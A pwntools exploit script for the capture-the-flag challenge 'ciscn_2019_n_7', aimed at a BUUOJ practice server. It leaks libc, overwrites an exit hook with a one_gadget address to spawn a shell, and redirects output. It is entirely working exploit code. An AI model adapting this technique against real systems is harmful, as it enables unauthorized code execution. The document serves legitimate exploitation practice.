#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/22 21:26:07
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = "amd64"
if debug:
    if context.arch == "amd64":
        sh = process(["./ciscn_2019_n_7"],env={'LD_PRELOAD':'../../libc_file/16-64-libc-2.23.so'})
        sh = process('./ciscn_2019_n_7')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #libc = ELF("../../libc_file/16-64-libc-2.23.so")
        one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
    else:
        sh = process(["./ciscn_2019_n_7"],env={'LD_PRELOAD':'../../libc_file/16-32-libc-2.23.so'})
        #sh = process("./")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc = ELF("../../libc_file/16-32-libc-2.23.so")
else:
    IP = 'node4.buuoj.cn'
    port = 27516
    sh = remote(IP,port)
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
def debug():
    gdb.attach(sh)
    pause()

elf = ELF('ciscn_2019_n_7')

def cmd(choice):
    sh.recvuntil("Your choice-> \n")
    sh.sendline(str(choice))

def add(size,name):
    cmd(1)
    sh.recvuntil("Input string Length: \n")
    sh.sendline(str(size))
    sh.recvuntil("Author name:\n")
    sh.send(name)

def edit(name,content):
    cmd(2)
    sh.recvuntil("New Author name:\n")
    sh.send(name)
    sh.recvuntil("New contents:\n")
    sh.send(content)

def show():
    cmd(3)


cmd(666)
sh.recvuntil("0x")
puts_addr = int(sh.recv(12),16)
libc_base = puts_addr - libc.symbols['puts']
log.info("libc_base=>{}".format(hex(libc_base)))
exit_hook = libc_base +  0x5f0040 + 3848
add(0x20,'a'*8+p64(exit_hook))
one = libc_base + one_offset[3]
edit('a'*7,p64(one))
cmd(4)
sh.sendline("exec 1>&0")
sh.interactive()